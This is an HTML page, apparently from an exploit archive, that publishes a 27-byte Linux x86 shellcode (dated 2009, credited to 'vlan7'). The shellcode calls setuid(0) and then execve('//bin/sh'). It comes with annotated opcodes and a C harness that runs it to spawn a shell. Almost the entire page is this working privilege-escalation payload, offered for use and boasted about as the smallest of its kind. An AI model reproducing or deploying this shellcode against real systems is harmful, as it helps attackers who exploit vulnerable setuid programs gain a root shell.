<html><head><title>Linux/x86 - setuid() &amp; execve() - 27 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;

const char sc[]= &quot;\x31\xdb&quot; //xor ebx,ebx
                 &quot;\x8d\x43\x17&quot; //LEA eax,[ebx + 0x17] /LEA is FASTER tha push/pop
                 &quot;\x99&quot; //cdq
                 &quot;\xcd\x80&quot; //int 80 //setuid(0) shouldn't returns -1 right? ;)
                 &quot;\xb0\x0b&quot; //mov al,0bh
                 &quot;\x52&quot; //push edx /Termina la cadena //bin/sh con un 0
                 &quot;\x68\x6e\x2f\x73\x68&quot;
                 &quot;\x68\x2f\x2f\x62\x69&quot;
                 &quot;\x89\xe3&quot; //mov ebx,esp
                 &quot;\x89\xd1&quot; //mov ecx,edx
                 &quot;\xcd\x80&quot;; //int 80h

int main()
{
  printf(&quot;\nSMALLEST SETUID &amp; EXECVE GNU/LINUX x86 STABLE SHELLCODE &quot;
        &quot;WITHOUT NULLS THAT SPAWNS A SHELL&quot;
                        &quot;\n\nCoded by vlan7&quot;
                        &quot;\n\t + vlan7[at]bigfoot.com&quot;
                        &quot;\n\t + http://vlan7.blogspot.com&quot;
                        &quot;\n\n[+] Date: 4/Jul/2009&quot;
                        &quot;\n[+] Thanks to: sch3m4. He initiated the funny game.&quot;
                        &quot;\n\n[+] Shellcode Size: %d bytes\n\n&quot;,
                        sizeof(sc)-1);
        (*(void (*)()) sc)();
        return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
